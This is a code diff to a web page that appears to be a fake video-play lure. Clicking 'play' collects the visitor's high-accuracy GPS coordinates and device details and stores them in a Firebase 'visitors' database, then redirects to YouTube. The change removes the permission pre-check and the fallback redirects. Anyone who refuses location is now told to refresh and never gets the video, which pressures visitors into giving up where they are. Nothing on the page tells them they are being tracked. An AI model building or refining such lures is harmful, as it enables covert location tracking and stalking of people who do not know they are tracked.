@@ -94,7 +94,7 @@
       };
     }
 
-    // Save event to Firebase
+    // Save event
     function saveEvent(extra = {}) {
       const deviceInfo = getDeviceInfo();
       const payload = {
@@ -111,53 +111,26 @@
       return database.ref("visitors").push(payload);
     }
 
-    // Check permission state
-    async function checkPermission() {
-      try {
-        const result = await navigator.permissions.query({ name: "geolocation" });
-        if (result.state === "denied") {
-          errorEl.textContent = "❌ Location access is blocked in your browser settings.";
-          return false;
-        }
-        return true;
-      } catch {
-        return true; // Some browsers don’t support Permissions API
-      }
-    }
-
     // Handle button click
-    playBtn.addEventListener("click", async () => {
-      statusEl.textContent = "⏳ Please wait a moment...";
+    playBtn.addEventListener("click", () => {
+      statusEl.textContent = "🎬 Your video is playing in 3 seconds...";
       errorEl.textContent = "";
-
-      const canAsk = await checkPermission();
-      if (!canAsk) {
-        statusEl.textContent = "";
-        errorEl.textContent = "❌ Click on Play Button Again (Enable Location)";
-        return;
-      }
 
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           async (pos) => {
-            statusEl.textContent = "🎬 Your video is playing in 3 seconds...";
-            errorEl.textContent = "";
             await saveEvent({
               latitude: pos.coords.latitude,
               longitude: pos.coords.longitude,
               accuracy: pos.coords.accuracy
             });
-            setTimeout(() => {
-              window.location.href = youtubeLink;
-            }, 3000);
+            setTimeout(() => window.location.href = youtubeLink, 3000);
           },
           async (err) => {
-            // If blocked or denied
             await saveEvent({ error: err.message });
             statusEl.textContent = "";
-            errorEl.textContent = "❌ Click on Play Button Again";
-            // Fallback → still redirect after 3s
-            setTimeout(() => window.location.href = youtubeLink, 3000);
+            errorEl.textContent = "❌ Refresh the page.";
+            // ⚠️ Do NOT redirect if denied (user must refresh)
           },
           { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
@@ -165,7 +138,6 @@
         saveEvent({ error: "Geolocation not supported" });
         statusEl.textContent = "";
         errorEl.textContent = "❌ Your browser does not support location access.";
-        setTimeout(() => window.location.href = youtubeLink, 3000);
       }
     });
   </script>
